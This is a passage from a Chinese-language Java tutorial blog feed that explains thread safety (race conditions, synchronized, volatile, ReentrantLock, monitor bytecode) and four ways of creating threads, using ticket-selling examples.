function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"抢到票"</span><span class="token operator">+</span>ticket<span class="token punctuation">)</span><span class="token punctuation">;</span>                ticket<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"票已售罄"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//3.创建一个实现类的对象</span>            Mythread t<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*4.每个线程各自创建一个以实现类对象为参数的Thread              类的对象*/</span>            Thread t1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread t2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            t1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程一"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//5.start开启进程</span>            t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>运行结果：<img src="https://i.loli.net/2020/07/22/nS9QeX3G67x4qMF.png" alt=""><br><strong><em>不难发现,产生了重票</em></strong></p><h4 id="emsp-3-原因分析："><a href="#emsp-3-原因分析：" class="headerlink" title=" 3.原因分析："></a> 3.原因分析：</h4><p> 由于可能在同一时间多个线程同时对共享变量进行操作,正是由于同时操作,所以导致得到的票重复之类的问题<br><img src="https://i.loli.net/2020/07/22/4yRtEDVuIfGYe5i.png" alt=""></p><h4 id="emsp-4-解决方法"><a href="#emsp-4-解决方法" class="headerlink" title=" 4.解决方法"></a> 4.解决方法</h4><p>  方式一(syncronized)：用synchronized进行同步的代码块,哪个进程拿到锁就哪个进程执行,如果没拿到的只能在外面等着,这保证了代码块最多只能有一个进程在执行   </p><p>例如:对于上面的代码示例中while内部用synchronized包起来,这样当线程一拿到锁开始抢票的时候其他线程都在while那里等着不往下执行,等线程一执行完代码块后锁释放出来再和其他进程一起去抢<br><img src="https://i.loli.net/2020/07/22/yxKSQ4LJvbIEzmX.png" alt=""></p><p><strong><em>注意： synchronized如果是把while也包进来了结果会是只有一个进程直接把所有票抢完,原因可以结合上面的原理自行分析<br>所以使用synchronized有一个原则:不能包的太多也不能太少</em></strong></p><h3 id="三-有序性"><a href="#三-有序性" class="headerlink" title="三.有序性"></a>三.有序性</h3><h4 id="emsp-1-概念-2"><a href="#emsp-1-概念-2" class="headerlink" title=" 1.概念:"></a> 1.概念:</h4><p> 代码执行顺序不是严格按照顺序从上到下执行的</p><h4 id="emsp-2-代码示例"><a href="#emsp-2-代码示例" class="headerlink" title=" 2.代码示例():"></a> 2.代码示例():</h4><p><img src="https://i.loli.net/2020/07/22/jUxlerpFIzoRmn4.png" alt=""></p><pre><code>ready=true;num=2;经过重排序,执行顺序变成num=2;ready=true</code></pre><p>此时,如果线程二先执行并且重排序的话可能导致r.r1=0,我们要做得就是避免这种情况为了避免这种情况</p><h4 id="emsp-3-原因分析"><a href="#emsp-3-原因分析" class="headerlink" title=" 3.原因分析"></a> 3.原因分析</h4><p> 程序代码在执行过程中的先后顺序，由于Java在编译期以及运行期的优化,导致了代码的执行顺序未必就是开发者编写代码时的顺序</p><h4 id="emsp-4-解决方法-1"><a href="#emsp-4-解决方法-1" class="headerlink" title=" 4.解决方法:"></a> 4.解决方法:</h4><p> 方式一(synchronized关键字) :给上述代码的actor1和actor2内的代码加上synchronized,即便内部会发生重排序,但是不会影响到外部。因为加了synchronized之后只会有一个线程执行代码块中的内容<br> 方式二(volatile):给共享变量加上volatile,可以保证不发生重排序</p><h2 id="二-synchronized的可重入性"><a href="#二-synchronized的可重入性" class="headerlink" title="二.synchronized的可重入性"></a>二.synchronized的可重入性</h2><h3 id="emsp-1-概念-3"><a href="#emsp-1-概念-3" class="headerlink" title=" 1.概念:"></a> 1.概念:</h3><p> synchronized允许多层嵌套  </p><h3 id="emsp-2-代码示例-1"><a href="#emsp-2-代码示例-1" class="headerlink" title=" 2.代码示例:"></a> 2.代码示例:</h3><pre><code>class Mythread extends Thread{//2.重写run方法@Overridepublic void run() {     synchronized (this){         System.out.println(getName()+"进入同步代码块1");         synchronized (this){             System.out.println(getName()+"进入同步代码块2");         }     } }}  public class Test1 {    public static void main(String[] args) {        Mythread t1= new Mythread();        Mythread t2= new Mythread();        t1.setName("线程一");        t2.setName("线程二");        t1.start();        t2.start();    }}</code></pre><p>代码结果：<img src="https://i.loli.net/2020/07/22/XTxWcgEyhAD1dHz.png" alt=""></p><h3 id="emsp-3-可重入的原理-好处-小结"><a href="#emsp-3-可重入的原理-好处-小结" class="headerlink" title=" 3.可重入的原理,好处,小结"></a> 3.可重入的原理,好处,小结</h3><p><img src="https://i.loli.net/2020/07/22/yq2831ljgsYvVTI.png" alt=""><br><strong><em>关于synchronized的计数器：每进入一层synchronized就+1,到了结尾就-1</em></strong></p><hr><h2 id="三-synchronized的不可中断性"><a href="#三-synchronized的不可中断性" class="headerlink" title="三.synchronized的不可中断性"></a>三.synchronized的不可中断性</h2><h3 id="emsp-1-概念-4"><a href="#emsp-1-概念-4" class="headerlink" title=" 1.概念:"></a> 1.概念:</h3><p> 一个线程获得锁后,另一个线程想要获得锁，必须处于阻塞或等待状态,如果第一个线程不释放锁， 第二个线程会一直阻塞或等待，不可被中断。</p><h3 id="emsp-1-代码示例"><a href="#emsp-1-代码示例" class="headerlink" title=" 1.代码示例:"></a> 1.代码示例:</h3><pre><code>class Mythread implements Runnable{@Overridepublic void run() {    synchronized (this){    System.out.println(Thread.currentThread().getName()+"进入代码块");        try {            Thread.sleep(98899);        } catch (InterruptedException e) {            e.printStackTrace();        }    }}}public class Test1 {public static void main(String[] args) {    Mythread t= new Mythread();    Thread t1=new Thread(t);    Thread t2=new Thread(t);    t1.setName("线程一");    t2.setName("线程二");    t1.start();    try {        Thread.sleep(1000);    } catch (InterruptedException e) {        e.printStackTrace();    }    t2.start();    System.out.println(t1.getState());    System.out.println(t2.getState());    }}</code></pre><p>代码结果: <img src="https://i.loli.net/2020/07/22/bMRwQJrl41xHhNT.png" alt=""><br>当线程一还在执行的时候,线程二处于阻塞状态,即便手动暂停,线程二依旧处于阻塞状态,体现了synchronized的不可中断性,线程二只能在synchronized那一行等着锁释放</p><h2 id="四-Reentrantlock的可中断和不可中断"><a href="#四-Reentrantlock的可中断和不可中断" class="headerlink" title="四.Reentrantlock的可中断和不可中断"></a>四.Reentrantlock的可中断和不可中断</h2><h3 id="emsp-1-Lock可中断代码-lock-lock"><a href="#emsp-1-Lock可中断代码-lock-lock" class="headerlink" title=" 1.Lock可中断代码(lock.lock())"></a> 1.Lock可中断代码(lock.lock())</h3><pre><code>class Mythread implements Runnable{Lock lock=new ReentrantLock();@Overridepublic void run() {    lock.lock();    System.out.println(Thread.currentThread().getName()+"获得锁");        try {            sleep(50000);        } catch (InterruptedException e) {            e.printStackTrace();        }        lock.unlock();    System.out.println("释放锁");    }}public class Test1 {    public static void main(String[] args) {        Mythread t= new Mythread();        Thread t1=new Thread(t);        Thread t2=new Thread(t);        t1.setName("线程一");        t2.setName("线程二");        t1.start();        t2.start();        try {            sleep(2000);        } catch (InterruptedException e) {            e.printStackTrace();        }        System.out.println("停止第线程二前");        t2.interrupt();        System.out.println("停止第线程二后");        System.out.println(t1.getState());        System.out.println(t2.getState());    }}</code></pre><p>代码结果 :   <img src="https://i.loli.net/2020/07/22/QxqPIBuYdVa3R7t.png" alt=""><br>结果显示 :线程二处于WAITING状态,不可暂停  </p><h3 id="emsp-2-Lock的可中断性代码示例-trylock"><a href="#emsp-2-Lock的可中断性代码示例-trylock" class="headerlink" title=" 2.Lock的可中断性代码示例(trylock())"></a> 2.Lock的可中断性代码示例(trylock())</h3><p><img src="https://i.loli.net/2020/07/22/C6O4qlkLdsbzjf2.png" alt=""></p><p><strong><em>就是利用了 trylock,第二个参数是单位,比如SECOND就是秒</em></strong></p><hr><h2 id="五-javap反汇编学习synchronized的原理"><a href="#五-javap反汇编学习synchronized的原理" class="headerlink" title="五.javap反汇编学习synchronized的原理"></a>五.javap反汇编学习synchronized的原理</h2><h3 id="一-monitorenter"><a href="#一-monitorenter" class="headerlink" title="一.monitorenter"></a>一.monitorenter</h3><h4 id="1-JVM规范文档和反汇编代码"><a href="#1-JVM规范文档和反汇编代码" class="headerlink" title="1.JVM规范文档和反汇编代码"></a>1.JVM规范文档和反汇编代码</h4><p><img src="https://i.loli.net/2020/07/22/thSP8pnbC5AVYHJ.png" alt="JVM规范中描述monitorenter"><br><img src="https://i.loli.net/2020/07/22/xtgrq6MEQO4iRbC.png" alt="左边是代码,右边是反编译的结果"></p><h4 id="emsp-2-monitorenter小结"><a href="#emsp-2-monitorenter小结" class="headerlink" title=" 2.monitorenter小结"></a> 2.monitorenter小结</h4><p> synchronized的锁对象会关联一个monitor,这个monitor不是我们主动创建的,，是JVM的线程执行到这个同步代码块,发现锁对象没有monitor就会创建monitor monitor内部有两个重要的成员变量owner:拥有这把锁的线程,recursions会记录线程拥有锁的次数,当一个线程拥有monitor后其他线程只能等待</p><h3 id="二-monitorexit"><a href="#二-monitorexit" class="headerlink" title="二.monitorexit"></a>二.monitorexit</h3><h4 id="emsp-1-JVM规范文档和反汇编代码"><a href="#emsp-1-JVM规范文档和反汇编代码" class="headerlink" title=" 1.JVM规范文档和反汇编代码"></a> 1.JVM规范文档和反汇编代码</h4><p><img src="https://i.loli.net/2020/07/22/Vwltz6pyBC21YZn.png" alt="JVM规范中描述monitorexit"><br><img src="https://i.loli.net/2020/07/22/K2Q4BsAVd37SrF9.png" alt="左边是代码,右边是反编译的结果"></p><p><strong><em>注意：从反汇编的Exception table可以看出：synchronized一旦出现异常是会释放锁的</em></strong></p><h3 id="三-同步方法"><a href="#三-同步方法" class="headerlink" title="三.同步方法"></a>三.同步方法</h3><p><img src="https://i.loli.net/2020/07/22/fTW3lakubmZS4Fs.png" alt=""><br><strong><em>也就是说在进入方法时隐式调用monitorenter,结束的时候隐式调用monitorexit</em></strong></p><h3 id="四-小结"><a href="#四-小结" class="headerlink" title="四.小结"></a>四.小结</h3><p>  通过javap反汇编我们看到synchronized使用编程了monitorentor和monitorexit两个指令.每个锁对象都会关联一个monitor(监视器,它才是真正的锁对象),它内部有两个重要的成员变量owner会保存获得锁的线程,recursions会保存线程获得锁的次数当执行到monitorexit时,recursions会-1 ,当计数器减到0时这个线程就会释放锁</p><h2 id="emsp-五-synchronized和lock的区别-面试题"><a href="#emsp-五-synchronized和lock的区别-面试题" class="headerlink" title=" 五.synchronized和lock的区别(面试题)"></a> 五.synchronized和lock的区别(面试题)</h2><p><img src="https://i.loli.net/2020/07/22/HU81YTzqOyjGNZo.png" alt=""><br>注1:由于synchronized是重量锁,效率比较低,虽然相较于以前进行了优化<br>注2:ReentranLock是否是公平锁可以自己控制,在实例化lock的时候参数不写就默认非公平,(fair)表示公平锁  </p><pre><code>    ReentrantLock lock=new ReentrantLock();//非公平锁    ReentrantLock lock=new ReentrantLock();//公平锁</code></pre><p>公平锁 :即满足队列的原则,先进先出<br>非公平锁 :所有进程同时抢一把锁看运气</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 线程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
            <tag> synchronized </tag>
            
            <tag> volatile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建多线程的四种方式(暂时不考虑线程安全问题)</title>
      <link href="/2020/07/19/jin-cheng-yu-xian-cheng/"/>
      <url>/2020/07/19/jin-cheng-yu-xian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="再次提醒：下文内容仅就总结多线程的创建方式-不考虑线程安全问题-且为了直观-在异常处理方面大量省略"><a href="#再次提醒：下文内容仅就总结多线程的创建方式-不考虑线程安全问题-且为了直观-在异常处理方面大量省略" class="headerlink" title="再次提醒：下文内容仅就总结多线程的创建方式,不考虑线程安全问题,且为了直观,在异常处理方面大量省略"></a>再次提醒：下文内容仅就总结多线程的创建方式,不考虑线程安全问题,且为了直观,在异常处理方面大量省略</h1><h2 id="一-程序-进程-线程的基本概念"><a href="#一-程序-进程-线程的基本概念" class="headerlink" title="一.程序,进程,线程的基本概念"></a>一.程序,进程,线程的基本概念</h2><p><img src="https://i.loli.net/2020/07/20/atozTYeqNsSMl3H.png" alt=""><br> 这里只要做简单的了解即可,红字部分有印象就行,详细内容在虚拟机部分做具体解释</p><h2 id="二-创建多线程的四种方式-以多线程抢票为背景"><a href="#二-创建多线程的四种方式-以多线程抢票为背景" class="headerlink" title="二.创建多线程的四种方式(以多线程抢票为背景)"></a>二.创建多线程的四种方式(以多线程抢票为背景)</h2><h2 id="①在JDK5-0之前："><a href="#①在JDK5-0之前：" class="headerlink" title="①在JDK5.0之前："></a>①<strong><em>在JDK5.0之前：</em></strong></h2><h3 id="emsp-方式一：继承Thread类"><a href="#emsp-方式一：继承Thread类" class="headerlink" title=" 方式一：继承Thread类"></a> 方式一：继承Thread类</h3><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//1.创建一个子类继承Thread</span>    <span class="token keyword">class</span> <span class="token class-name">Mythread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> ticket<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2.重写run方法</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ticket<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"抢到票"</span><span class="token operator">+</span>ticket<span class="token punctuation">)</span><span class="token punctuation">;</span>                ticket<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"票已售罄"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span>  <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">// 3.实例化子类对象</span>            Mythread t1<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Mythread t2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程一"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 4.start开启线程</span>            t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><hr><p><strong><em>总结：继承Thread创建多线程的步骤：<br>  1.创建一个子类继承Thread<br>  2.重写run方法<br>  3.实例化子类对象<br>  4.start开启线程</em></strong></p><hr><h3 id="emsp-方式二：实现Runnable接口"><a href="#emsp-方式二：实现Runnable接口" class="headerlink" title=" 方式二：实现Runnable接口"></a> 方式二：实现Runnable接口</h3><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//1.创建一个实现Runnable接口的类</span>    <span class="token keyword">class</span> <span class="token class-name">Mythread</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> ticket<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2.重写run方法</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ticket<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"抢到票"</span><span class="token operator">+</span>ticket<span class="token punctuation">)</span><span class="token punctuation">;</span>                ticket<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token punctuation">{</span>                  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"票已售罄"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//3.创建一个实现类的对象</span>            Mythread t<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/*4.每个线程各自创建一个以实现类对象为参数的Thread              类的对象*/</span>            Thread t1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread t2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            t1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程一"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"线程二"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//5.start开启进程</span>            t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><hr><p><strong><em>总结：继承Thread创建多线程的步骤：<br>  1.创建一个实现Runnable接口的类<br>  2.重写run方法<br>  3.创建一个实现类的对象<br>  4.每个线程各自创建一个以实现类对象为参数的Thread类的对象<br>  5.start开启进程</em></strong></p><hr><h3 id="关于Thead带参构造器的源码："><a href="#关于Thead带参构造器的源码：" class="headerlink" title="关于Thead带参构造器的源码："></a>关于Thead带参构造器的源码：</h3><pre><code>public Thread(Runnable target) {    init(null, target, "Thread-" + nextThreadNum(), 0);}</code></pre><p>不难发现,其参数必须是Runnable接口实现类的对象  </p><p><strong><em>注:相比于继承Thread类,方式二可以直接实现数据共享,方式一需要用static修饰成员变量(这一点在讲同步的时候尤其重要)</em></strong></p><hr><h2 id="②在JDK5-0新增："><a href="#②在JDK5-0新增：" class="headerlink" title="②在JDK5.0新增："></a>②<strong><em>在JDK5.0新增：</em></strong></h2><h3 id="emsp-方式三-借助FutureTask类和Callable接口"><a href="#emsp-方式三-借助FutureTask类和Callable接口" class="headerlink" title=" 方式三:借助FutureTask类和Callable接口"></a> 方式三:借助FutureTask类和Callable接口</h3><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//1.创建一个实现Callable接口的类</span>    <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//2.重写call函数(由于多态,Obj的返回值类型可以自动向下转化)</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Object <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            <span class="token keyword">int</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">100</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sum <span class="token operator">+=</span> i<span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> sum<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token punctuation">,</span> UnknownHostException <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//3.创建一个实现类的对象</span>            MyThread myThread<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//4.创建一个FutureTask的对象,传入Callable实现类的对象</span>            FutureTask futureTask<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token punctuation">(</span>myThread<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//5.创建一个Thread类的对象传入对象futureTask并start</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//6.如果需要返回值,再调用futureTask.get()来取返回值</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                Object sum<span class="token operator">=</span>futureTask<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"总和为"</span><span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ExecutionException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><hr><p>总结:<br>  1.创建一个实现Callable接口的类<br>  2.重写call方法<br>  3.创建一个实现类的对象<br>  4.创建一个FutureTask的对象,传入Callable实现类的对象<br>  5.创建一个Thread类的对象传入对象futureTask并start<br>  6.如果需要call函数的返回值,需要调用future.get()的方法</p><p><strong><em>注:Callable可以简单认为是Runnable的升级版,Callable允许有返回值功能更强大</em></strong></p><p><img src="https://i.loli.net/2020/07/20/AefVTnO3Wwld7sj.png" alt=""><br><img src="https://i.loli.net/2020/07/20/KdbyL2SRvIpDi3O.png" alt=""></p><h3 id="关于FutureTask构造器的源码解析"><a href="#关于FutureTask构造器的源码解析" class="headerlink" title="关于FutureTask构造器的源码解析"></a>关于FutureTask构造器的源码解析</h3><p><img src="https://i.loli.net/2020/07/20/rAUoceJVH86GYRF.png" alt=""><br><img src="https://i.loli.net/2020/07/20/mShDs6cjOlNERJg.png" alt=""><br><img src="https://i.loli.net/2020/07/20/RhTQ9D47BejrCoz.png" alt=""><br>不难发现,FutrueTask其实继承了Runnable,所以在Tread实例化的时候可以直接带FutureTask的对象,并且上图中的构造器中对callable进行了回调</p><hr><h3 id="emsp-方式四：调用线程池来实现多线程-开发中主要还是用线程池"><a href="#emsp-方式四：调用线程池来实现多线程-开发中主要还是用线程池" class="headerlink" title=" 方式四：调用线程池来实现多线程(开发中主要还是用线程池)"></a> 方式四：调用线程池来实现多线程(开发中主要还是用线程池)</h3><p><img src="https://i.loli.net/2020/07/20/MmVdAXyKNHCvtUS.png" alt=""></p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//1.创建一个实现Runnable接口的类</span>    <span class="token keyword">class</span> <span class="token class-name">Mythread</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> ticket<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2.重写run方法</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token 